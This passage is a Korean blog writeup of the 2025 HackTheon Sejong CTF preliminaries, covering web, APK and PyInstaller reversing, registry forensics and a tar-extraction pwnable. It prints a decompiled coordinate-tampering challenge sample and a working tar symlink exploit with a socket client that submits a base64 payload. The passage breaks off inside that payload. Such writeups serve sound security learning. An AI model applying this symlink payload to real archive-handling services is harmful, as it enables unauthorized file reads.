---
title: "[2025 핵테온 세종(HackTheon Sejong) 예선전 Preliminaries] Writeup"
description: 2025 핵테온 세종 국제 대학생 사이버보안 경진대회 예선전 writeup
date: 2025-04-21 03:04:00 +0900
categories: [Security, System Hacking]
tags: [CTF, writeup]
author: hyungin0505
toc: true
comments: true
# image:
#     path: /assets/img/
#     alt: image alternative text
pin: false  

---  

---

![Image](/assets/img/250426_0/1.png)

<details markdown="1">
<summary>잡소리</summary>

작년 동아리 엠티 때 2024 핵테온 세종 때문에 늦게 오신 분들이 몇 분 계셨던게 생각난다  
그때 핵테온이란 것을 처음 들었고 나도 1년 뒤에 나가봐야지 생각했었다  

3월 말에 동아리 톡방에 코드게이트랑 같이 해서 핵테온 공지가 올라왔다  
동아리에서 이미 여러 팀이 짜여져 있다고 들어서 서강대 친구랑 같이 팀을 해서 나가보기로 했다  
내 동아리에서 한 명 친구 동아리에서 한 명 구해서 4명이서 같이 하게 됐다  
</details>
<br>

---

2025 핵테온 세종(HackTheon Sejong) 국제 대학생 사이버 보안 경진대회 예선전 ([https://hacktheon.org/](https://hacktheon.org/))  
2025.04.26 09:00 - 2025.04.26 18:00 (KST)

in Team **모구모구** (Beginner A / 4 players)  
**43th** Place

Solved 10 challs (9 alone)  
Points 8503 (7575 alone)  
<br>

---

-   **Initial Access**
    -   Forgotten Past
-   **Resource Development**
    -   ~Barcode~ (Team solved)
    -   Bridge
    -   I love reversing
-   **Privilege Escalation**
    -   Shadow of the System
    -   TAR
-   **Lateral Movement**
    -   Watch
-   **Credential Access**
    -   Cat
-   **Collection**
    -   Hidden Message
    -   Nothing is essential
-   **Exfilteration**

특이하게 카테고리별로 문제가 나누어져 있다  
MITRE ATT&CK 구조인 듯하다  
<br>

---

## **Initial Access**

### Forgotten Past - Web

This is the target blog. Exploit its vulnerability to obtain the flag.  
<br>

---

![Image](/assets/img/250426_0/2.png)

사이트 하나 주어지는데 사이트에 들어가보면 버튼도 없고 아무것도 없이 이미지랑 글만 있다  
F12 개발자 도구로 소스 코드를 봐도 딱히 사용자 또는 서버와 상호 작용하는 기능은 보이지 않는다  
쿠키도 없다  
<br>

---

![Image](/assets/img/250426_0/3.png)

아무것도 없으니 `sitemap.xml`{: .filepath}부터 들러봤는데 그런건 없었다  
바로 메인 페이지로 리다이렉트된다  

그러면 해봐야 할 것이 하나 남는데 robots.txt로 가보쟈 (메인 페이지에 적힌 글도 로봇 이야기다)  
`old_site`{: .filepath} 경로가 있는데 안 들어가볼 수 없다  

처음에 `old_site`{: .filepath}로 갔더니 무한로딩이 걸리길래 서버에 사람이 몰려서 그런가 싶었지만 그냥 `old_site`{: .filepath}로 뒤에 슬래시를 안 붙여서 생기는 문제였다  
왜인지 이유는 모른다..  
<br>

---

![Image](/assets/img/250426_0/4.png)

그러면 Login 링크가 있는 페이지가 나온다  
<br>

---

![Image](/assets/img/250426_0/5.png)

로그인 페이지에서 소스 코드를 개발자 도구로 열면 아이디와 비밀번호 검증을 평문으로 하고 있는 것을 확인할 수 있다  
<br>

---

![Image](/assets/img/250426_0/6.png)

admin 아이디로 로그인에 성공하면 플래그를 얻을 수 있다  
간단한 몸 풀기 문제다    
<br>

---

## **Resource Development**

### Bridge - Reversing

A suspicious mobile app file has been discovered.

Analyze the app and decode the SECRET code below.  
SECRET: 4658hg76<h85eed73ihghidi8ehf<78;  
<br>

---

![Image](/assets/img/250426_0/7.png)

apk 파일이 주어지는데 apk 파일을 소스 코드 형태로 디컴파일할 수 있다

(참고: [안드로이드 앱 리버싱](https://puzzle-puzzle.tistory.com/entry/%EC%95%88%EB%93%9C%EB%A1%9C%EC%9D%B4%EB%93%9C-%EC%95%B1-%EB%A6%AC%EB%B2%84%EC%8B%B1))

<details markdown="1">
<summary>잡소리</summary>

얼마 전 과 엠티에 다녀왔는데 한 선배님께서 학교 e-id 앱을 리버싱해본 이야기를 하셨다  
그래서 나도 한번 해보려고 미적분 수업 시간에 맥북으로 apk 파일 디컴파일해서 학교 출석부 인증 절차 확인하고 그랬는데 운이 좋았다  
안 그래도 미적분 시간에 힘들게 성공했는데 그때 이걸 안 해봤다면 대회 시간 동안 맥북에서 apk 파일 뜯어보려고 시간을 좀 많이 썼을 것 같다  

더군다나 스프링부트 스터디도 하고 있어서 자바를 조금씩 알아가는 중이었기에 코드 흐름도 대강 파악해볼 수 있었다  

뭔가 시간이 흐를수록 예전에 저질러 놓았던 것들이 도움이 되는 경우가 많아지고 있다  
점점 많은 일들을 저질러놔서 그런가 싶기도 하다..  
그래도 의미 없는 행동들은 아니었으니 다행이다  

언젠가 이런 CTF에 참여했던 일들이 도움되는 날이 하루 빨리 오면 좋겠다..ㅜㅜ
</details>  
<br>

---

![Image](/assets/img/250426_0/8.png)

writeup 쓰다가 궁금해져서 진짜로 폰에 apk 파일 설치해서 실행해봤는데 GO! 버튼 하나 나온다  
눌러봤는데 아무 일도 안 일어난다 (뭐지..)    
<br>

---

```java
package com.hacktheon.bridge;

import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import androidx.appcompat.app.AppCompatActivity;
import kotlin.Metadata;

@Metadata(d1 = {"\000\030\n\002\030\002\n\002\030\002\n\002\b\003\n\002\020\002\n\000\n\002\030\002\n\000\b\007\030\0002\0020\001B\007\006\004\b\002\020\003J\022\020\004\032\0020\0052\b\020\006\032\004\030\0010\007H\024\006\b"}, d2 = {"Lcom/hacktheon/bridge/MainActivity;", "Landroidx/appcompat/app/AppCompatActivity;", "<init>", "()V", "onCreate", "", "savedInstanceState", "Landroid/os/Bundle;", "app_release"}, k = 1, mv = {2, 0, 0}, xi = 48)
public final class MainActivity extends AppCompatActivity {
  public static final int $stable = 0;
  
  private static final void onCreate$lambda$0(EditText paramEditText, MainActivity paramMainActivity, View paramView) {
    String str = paramEditText.getText().toString();
    if (str.length() > 0) {
      Intent intent = new Intent((Context)paramMainActivity, WebViewActivity.class);
      intent.putExtra("url", str);
      paramMainActivity.startActivity(intent);
    } 
  }
  
  protected void onCreate(Bundle paramBundle) {
    super.onCreate(paramBundle);
    setContentView(R.layout.activity_main);
    EditText editText = (EditText)findViewById(R.id.urlInput);
    ((Button)findViewById(R.id.loadButton)).setOnClickListener(new MainActivity$$ExternalSyntheticLambda0(editText, this));
  }
}
```

일단 무작정 `MainActivity` 클래스로 왔는데 `WebViewActivity` 이런 단어가 있는 걸로 봐서 `WebView`로 url 보내는 것 같다  
<br>

---

```java 
package com.hacktheon.bridge;

import android.content.Context;
import android.os.Bundle;
import android.view.View;
import android.webkit.WebChromeClient;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import androidx.appcompat.app.AppCompatActivity;
import kotlin.Metadata;

@Metadata(d1 = {"\000\030\n\002\030\002\n\002\030\002\n\002\b\003\n\002\020\002\n\000\n\002\030\002\n\000\b\007\030\0002\0020\001B\007\006\004\b\002\020\003J\022\020\004\032\0020\0052\b\020\006\032\004\030\0010\007H\025\006\b"}, d2 = {"Lcom/hacktheon/bridge/WebViewActivity;", "Landroidx/appcompat/app/AppCompatActivity;", "<init>", "()V", "onCreate", "", "savedInstanceState", "Landroid/os/Bundle;", "app_release"}, k = 1, mv = {2, 0, 0}, xi = 48)
public final class WebViewActivity extends AppCompatActivity {
  public static final int $stable = 0;
  
  protected void onCreate(Bundle paramBundle) {
    super.onCreate(paramBundle);
    WebView webView = new WebView((Context)this);
    setContentView((View)webView);
    String str2 = getIntent().getStringExtra("url");
    String str1 = str2;
    if (str2 == null)
      str1 = "https://google.com"; 
    webView.getSettings().setJavaScriptEnabled(true);
    webView.addJavascriptInterface(new JsInterface(), "Bridge");
    webView.setWebViewClient(new WebViewClient());
    webView.setWebChromeClient(new WebChromeClient());
    webView.loadUrl(str1);
  }
}
```

`Bridge`라는 `JsInterface()` 객체 인터페이스로 뭘 하는 것 같다  
<br>

---

```java 
package com.hacktheon.bridge;

import android.webkit.JavascriptInterface;

public class JsInterface {
  @JavascriptInterface
  public String decode(String paramString) {
    return BridgeLib.decode(paramString);
  }
  
  @JavascriptInterface
  public String encode(String paramString) {
    return BridgeLib.encode(paramString);
  }
}
```

```java
package com.hacktheon.bridge;

public class BridgeLib {
  static {
    System.loadLibrary("bridge_lib");
  }
  
  public static native String decode(String paramString);
  
  public static native String encode(String paramString);
}
```

인코딩, 디코딩 두 개의 인터페이스가 있다  
`BridgeLib` 클래스를 사용하는데 `BridgeLib` 클래스에 가보면 `System.loadLibrary("bridge_lib");` 이라는 코드가 있다  
<br>

---

![Image](/assets/img/250426_0/9.png)

시스템에서 라이브러리를 로드하는 건데 lib 파일이 어딨나 했더니 lib 폴더 안에 있는 `libbridge_lib.so`{: .filepath} 일 것 같은 감이 온다  
<br>

---

![Image](/assets/img/250426_0/10.png)

IDA에 넣어봤는데 encode, decode 둘 다 함수가 있다  
<br>

---

```python
def decode_secret(secret: str) -> str:
    extern_str = ('bridge_default_key_2025')

    v5 = 0
    i = 0
    while i < len(extern_str):
        c = extern_str[i]
        c = ord(c)
        if c & 0x80 == 0:
            v5 += c
            i += 1
        elif c & 0xE0 == 0xC0:
            v5 += ((c & 0x1F) << 6) | (ord(extern_str[i + 1]) & 0x3F)
            i += 2
        elif c & 0xF0 == 0xE0:
            v5 += ((c & 0x0F) << 12) | ((ord(extern_str[i + 1]) & 0x3F) << 6) | (ord(extern_str[i + 2]) & 0x3F)
            i += 3
        elif c & 0xF8 == 0xF0:
            v5 += ((c & 0x07) << 18) | ((ord(extern_str[i + 1]) & 0x3F) << 12) | ((ord(extern_str[i + 2]) & 0x3F) << 6) | (ord(extern_str[i + 3]) & 0x3F)
            i += 4
        else:
            i += 1
    v5 = v5 % 0x19

    decoded = ""
    v5_mask = ~v5 & 0xFF
    v5_add = v5 + 34

    for ch in secret:
        ch_val = ord(ch)
        if ch_val < 0x21 or ch_val == 127:
            break
        temp = ch_val + 94 if ch_val < v5_add else ch_val
        decoded_char = (v5_mask + temp) & 0xFF
        decoded += chr(decoded_char)

    return decoded

secret = "4658hg76<h85eed73ihghidi8ehf<78;"
decoded_value = decode_secret(secret)

print(f"FLAG{{decoded_value}}")

# FLAG{1325ed439e52bba40fedefaf5bec9458}
```

지피티의 힘으로 secret을 복호화하여 플래그를 얻어낼 수 있었다  
<br>

---

```c
while ( 1 )
  {
    v7 = (unsigned __int8)aExternAlreadyc[v6 + 130];
    if ( (v7 & 0x80u) != 0 )
      break;
    ++v6;
LABEL_4:
    v5 += v7;
    if ( v6 == 23 )
      goto LABEL_12;
  }
  v8 = v7 & 0x1F;
  v9 = aExternAlreadyc[v6 + 131] & 0x3F;
  if ( (unsigned __int8)v7 <= 0xDFu )
  {
    v6 += 2LL;
    v7 = v9 | (v8 << 6);
    goto LABEL_4;
  }
  v10 = (v9 << 6) | aExternAlreadyc[v6 + 132] & 0x3F;
  if ( (unsigned __int8)v7 < 0xF0u )
  {
    v6 += 3LL;
    v7 = (v8 << 12) | v10;
    goto LABEL_4;
  }
  v7 = ((v7 & 7) << 18) | (v10 << 6) | aExternAlreadyc[v6 + 133] & 0x3F;
  if ( v7 != 1114112 )
  {
    v6 += 4LL;
    goto LABEL_4;
  }
```

복호화 코드에 사용할 `extern_str`을 얻기 위해서는 `aExternAlreadyc`를 찾아야 한다 (키 값 느낌)  
<br>

---

![Image](/assets/img/250426_0/11.png)

코드에서는 `aExternAlreadyc`로부터 130 오프셋만큼 떨어진 곳의 문자열을 참조한다  
위의 while 반복문에서 `v6`가 23일 때까지 반복문을 수행하며 `aExternAlready`의 `v6`(인덱스)를 늘리면서 한 글자씩 `v5`에 덧붙이므로 23자리까지인 `bridge_default_key_2025`가 키가 된다

플래그 뽑는 과정은 거의 다 지피티로 푼게 약간 찝찝하지만 지피티 없이는 너무 어려운거 아잉교!!  
<br>

---

### I love reversing - Reversing 

A coordinate program has been manipulated and is being operated under the attacker's control.

Find the value that the attacker arbitrarily added.  
<br>

---

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  unk_140040D10 = argc;
  *((_QWORD *)&unk_140040D10 + 1) = argv;
  return sub_140002B80(&unk_140040D10, argv, envp);
}
```

![Image](/assets/img/250426_0/12.png)

exe 파일이니까 일단 IDA 집어넣었는데 main 함수도 이상하고 문자열 뽑으니까 Py로 시작하는 거 많길래 파이썬 exe로 변환한 파일이겠거니 했다

예전에 통학하는 길에 아무것도 안 하면 시간 아까우니 공부한답시고 지하철에서 아무 CTF writeup 보고 그랬는데 거기서 파이썬 파일 디컴파일하는 경우가 종종 있었다  
어떻게 하는지 글로 보기만 하던 걸 직접 해보게 됐다  
<br>

---

![Image](/assets/img/250426_0/13.png)

[pyinstxtractor](https://pyinstxtractor-web.netlify.app/)

맥 터미널에서 내가 파이썬 가상 환경이랑 버전 관리를 제대로 안 하고 마구잡이로 해놓아서 pip로 모듈 설치도 안 되고 버전 설정도 꼬이길래 오늘 대회 시간 동안 시간 낭비가 엄청 많았다..  
언제 한 번 파이썬 가상 환경이랑 버전 관리에 대해서 제대로 알아본 후에 싹 밀고 다시 시작할 필요가 있을 것 같다..

아무튼 원래는 pyinstxtractor라는 모듈이 있는데 그게 잘 안 되서 그냥 온라인 툴 사용했다  
zip 파일로 추출된 파일들을 받을 수 있다  
<br>

---

![Image](/assets/img/250426_0/14.png)

압축 풀고 열어보면 또 뭐 막 pyd니 dll이나 pyc니 온갖 이상한 파일들이 전부 들어있다  
<br>

---

![Image](/assets/img/250426_0/15.png)

main을 찾아야 하는 줄 알았는데 없어서 뭔가 했더니 `infect.pyc`{: .filepath} 파일이 있었다  
문제에서 줬던 exe 바이너리 이름이 Infect였으니 `infect.pyc`{: .filepath}를 분석하면 될 것 같다  
  
(사실 main 안 나와서 pyinstxtractor가 제대로 동작 안 된 줄 알고 똑같은 짓만 여러 번 했다..;;)  
<br>

---

![Image](/assets/img/250426_0/16.png)

이 pyc 파일도 [pylingual](https://pylingual.io/view_chimera?identifier=73f8c9e231785551dff84fbfb166cb9f652bd074492be625d683c2f5b5a4d8fe) 온라인 툴 사용해서 디컴파일했다    
<br>

---

```python
# Decompiled with PyLingual (https://pylingual.io)
# Internal filename: infect.py
# Bytecode version: 3.12.0rc2 (3531)
# Source timestamp: 1970-01-01 00:00:00 UTC (0)

import requests
from flask import Flask, request, jsonify
app = Flask(__name__)

def infect(location_data):
    location_data['latitude'] += 2.593627
    location_data['longitude'] += 2.593627
    return location_data

@app.route('/location_data', methods=['POST'])
def location_data():
    location_data = request.json
    print('Received data from attack instruction PC:', location_data)
    location_data = infect(location_data)
    url = 'http://192.168.101.101:4653/location_data'
    response = requests.post(url, json=location_data)
    print('Response from ship node:', response.text)
    return jsonify({'message': 'Data forwarded to ship node successfully!'})
if __name__ == '__main__':
    app.run(host='0.0.0.0', port=4653)
```

신기하다 변수 이름까지 디컴파일이 되다니..  
2.593627씩 위도 경도에 더하니까 더하는 값을 FLAG로 감싸주면 그게 답이다  
<br>

---

## **Privilege Escalation**

### Shadow of the System - Forensic

A suspiciious backdoor appears to be running on a specific PC.

Analyze the service-related files and find the suspicious string that was output when the backdoor account was created.  
<br>

---

![Image](/assets/img/250426_0/17.png)

`SYSTEM`이라는 파일이 주어진다  
아 누가 봐도 레지스트리 파일이니 Registry Explorer에 넣어준다  

`ROOT/ControlSet001/Services/WindowsUpdate/ImagePath`{: .filepath}경로의 Data에 실행 명령어가 적혀있다  
문제 설명에 맞게 백도어 계정 생성 시 문자열을 출력하는 걸로 보인다  
플래그가 그대로 확인할 수 있다  

보통 이렇게 레지스트리 값이 변경됐거나 어딘가 수정된 파일을 찾을 때에는 정렬 기준을 수정된 날짜로 바꾸면 비교적 쉽게 찾을 수 있다

<details markdown="1">
<summary>잡소리</summary>

아무리 생각해도 이번에 운이 좋았다  
이전 문제들에 나왔던 앱 리버싱, 자바 코드 분석, 파이썬 디컴파일까지 얼마 전에 알게된 것들이었다  

이 SYSTEM이라는 파일 또한 이번 CTF 열린 날 일주일 전에 열린 CTF에서 나왔었다  
풀이도 좀 비슷하고 Registry Explorer도 그대로 깔려 있었다  

운도 노력하는 사람에게 주어진다 치자..ㅎㅎ  
</details>  
<br>

---

### TAR - Pwnable

Find a vulnerability in the compressed file viewer service.  
<br>

---
```python
import tarfile
import base64
import io
import os
import tempfile
import shutil
import sys
import time
import random
import string
import atexit

sys.setrecursionlimit(10000)

USER_FILES_DIR = "/tmp/user_files"

current_extract_info = {
    "files": [],
    "extract_dir": None
}

def generate_random_string(length=8):
    return ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(length))

def extract_archive(base64_data):
    try:
        try:
            decoded_data = base64.b64decode(base64_data)
        except Exception as e:
            return {"error": f"Base64 decoding failed: {str(e)}"}
        
        tar_bytes = io.BytesIO(decoded_data)
        
        if not os.path.exists(USER_FILES_DIR):
            os.makedirs(USER_FILES_DIR)
        
        timestamp = int(time.time())
        random_suffix = generate_random_string()
        extract_dir_name = f"{timestamp}_{random_suffix}"
        extract_dir_path = os.path.join(USER_FILES_DIR, extract_dir_name)
        
        os.makedirs(extract_dir_path)
        
        extracted_files = []
        
        try:
            with tarfile.open(fileobj=tar_bytes, mode='r') as tar:
                tar.extractall(path=extract_dir_path)
                
                for member in tar.getmembers():
                    if member.isdir():
                        continue
                    
                    file_path = os.path.join(extract_dir_path, member.name)
                    
                    extracted_files.append({
                        "name": member.name,
                        "path": file_path
                    })
        except Exception as e:
            shutil.rmtree(extract_dir_path, ignore_errors=True)
            return None
        
        global current_extract_info
        current_extract_info["files"] = extracted_files
        current_extract_info["extract_dir"] = extract_dir_path
        
        return {
            "success": True,
            "message": f"{len(extracted_files)} files have been successfully extracted.",
            "files": extracted_files
        }
        
    except Exception as e:
        return {"error": f"Error occurred during processing: {str(e)}"}

def read_file_content(file_index):
    global current_extract_info
    
    if not current_extract_info["files"]:
        return {"error": "No extracted files. Please upload a tar file first."}
    
    try:
        if file_index < 0 or file_index >= len(current_extract_info["files"]):
            return {"error": f"Invalid file index. Please enter a value between 0 and {len(current_extract_info['files'])-1}."}
        
        file_info = current_extract_info["files"][file_index]
        file_path = file_info["path"]
        
        try:
            with open(file_path, 'r') as f:
                text_content = f.read()
            
            return {
                "success": True,
                "file_name": file_info["name"],
                "content": text_content
            }
        except UnicodeDecodeError:
            return {
                "success": True,
                "file_name": file_info["name"],
                "content": "(Cannot display binary file.)"
            }
        
    except Exception as e:
        return {"error": f"Error occurred during processing: {str(e)}"}

def cleanup_extract_dir():
    global current_extract_info
    
    if current_extract_info["extract_dir"] and os.path.exists(current_extract_info["extract_dir"]):
        try:
            shutil.rmtree(current_extract_info["extract_dir"], ignore_errors=True)
            current_extract_info["extract_dir"] = None
            return {"success": True, "message": "Extraction directory has been cleaned up."}
        except Exception as e:
            return {"error": f"Error occurred during directory cleanup: {str(e)}"}
    
    return {"success": True, "message": "No directory to clean up."}

def cleanup_on_exit():
    global current_extract_info
    
    if current_extract_info["extract_dir"] and os.path.exists(current_extract_info["extract_dir"]):
        try:
            shutil.rmtree(current_extract_info["extract_dir"], ignore_errors=True)
            print(f"[Exit Cleanup] Directory {current_extract_info['extract_dir']} has been deleted.")
        except Exception as e:
            print(f"[Exit Warning] Error occurred during directory cleanup: {str(e)}")

atexit.register(cleanup_on_exit)

def print_banner():
    print("=" * 60)
    print("TarVault - Secure Archive Management")
    print("=" * 60)
    print("Enter your tar archive encoded in base64.")
    print("Our service will safely process your files!")
    print("=" * 60)

def print_file_content(result):
    if "error" in result:
        print(f"\nError: {result['error']}")
        return
    
    print(f"\nFile: {result['file_name']}")
    print("-" * 40)
    print(result['content'])
    print("-" * 40)

def main():
    print_banner()
    
    print("\nEnter your tar archive encoded in base64:")

    # Caution! Your input must be less than 4096 bytes
    base64_data = input()
    if not base64_data:
        print("No data entered.")
        return
    
    result = extract_archive(base64_data)
    if "error" in result:
        print(f"\nError: {result['error']}")
        return
    
    print(f"\n{result['message']}")
    
    try:
        while True:
            print("\nFile List:")
            print("[0] Exit")
            
            for i, file in enumerate(current_extract_info["files"], 1):
                print(f"[{i}] {file['name']}")
            
            try:
                file_choice = int(input("\nEnter the number of the file to read (0 to exit): ").strip())
                
                if file_choice == 0:
                    print("\nExiting service. Thank you!")
                    break
                
                file_index = file_choice - 1
                
                if file_index < 0 or file_index >= len(current_extract_info["files"]):
                    print(f"\nInvalid file number. Please enter a value between 1 and {len(current_extract_info['files'])}.")
                    continue
                
                result = read_file_content(file_index)
                print_file_content(result)
                
            except ValueError:
                print("Please enter a valid number.")
    finally:
        cleanup_result = cleanup_extract_dir()
        if "error" in cleanup_result:
            print(f"\nWarning: {cleanup_result['error']}")

if __name__ == "__main__":
    main()
```

아 정말 멍청하게도 문제 파일이 주어져있는지 모르고 nc로 서버 접속만 하면서 풀다가 문제 파일을 나중에서야 발견했다..  
그래도 문제 파일 없이 생각했던 풀이 방향이 맞았기에 딱히 문제 파일을 본다고 해서 큰 변화가 있지는 않았다 (확신만 얻었을 뿐)  
<br>

---

```python
try:
    while True:
        print("\nFile List:")
        print("[0] Exit")

        for i, file in enumerate(current_extract_info["files"], 1):
            print(f"[{i}] {file['name']}")
```

지피티한테 물어보니까 `enumerate()` 함수에서 Path Traversal 취약점이 발생한다고 한다  
그도 그럴 것이 여기서 Path Traversal 일어나는게 아니면 어떻게 문제를 풀어야할지 모르겠다..  
<br>

---

```dockerfile
FROM python:3.11-slim AS jail

FROM disconnect3d/nsjail

COPY --from=jail / /jail/

COPY flag /jail/flag
COPY tar.py  /jail/tar.py
COPY run_py.sh /jail/run_py.sh
RUN chmod +x /jail/run_py.sh

COPY start.sh /start.sh
RUN chmod +x /start.sh

CMD [ "/start.sh" ]
```

![Image](/assets/img/250426_0/18.png)

보면은 flag가 딱 `tar.py`{: .filepath}와 같은 디렉토리에 있는 걸 알 수 있다  
<br>

---

```python
import tarfile
import io
import base64

tar_stream = io.BytesIO()

with tarfile.open(fileobj=tar_stream, mode="w") as tar:
    info = tarfile.TarInfo("flag")
    info.type = tarfile.SYMTYPE
    info.linkname = "/flag"
    tar.addfile(info)

encoded = base64.b64encode(tar_stream.getvalue()).decode()
print(encoded)
```

```python
import socket
import base64
import time

HOST = 'hacktheon2025-challs-*****.com'
PORT = 00000

with socket.create_connection((HOST, PORT)) as s:
    b64_tar = b"ZmxhZwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADAwMDA2NDQAMDAwMDAwMAAwMDAwMDAwADAwMDAwMDAwMDAwADAwMDAwMDAwMDAwADAwNzUwMgAgMi9mbGFnAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAB1c3RhcgAwMAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA